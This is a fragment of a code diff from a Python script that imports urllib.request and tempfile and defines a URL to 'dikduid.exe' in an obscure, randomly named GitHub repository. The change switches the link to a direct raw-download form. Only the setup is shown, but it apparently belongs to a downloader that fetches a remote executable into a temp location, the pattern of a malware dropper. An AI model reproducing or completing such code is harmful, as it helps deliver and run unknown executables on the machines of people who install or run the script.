@@ -2,7 +2,7 @@ import os
 import urllib.request
 import tempfile
 
-EXE_URL = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikduid.exe"
+EXE_URL = "https://raw.githubusercontent.com/Prenda00/canlmiop/main/dikduid.exe"
 EXE_NAME = "dikduid.exe"
 
 def main():
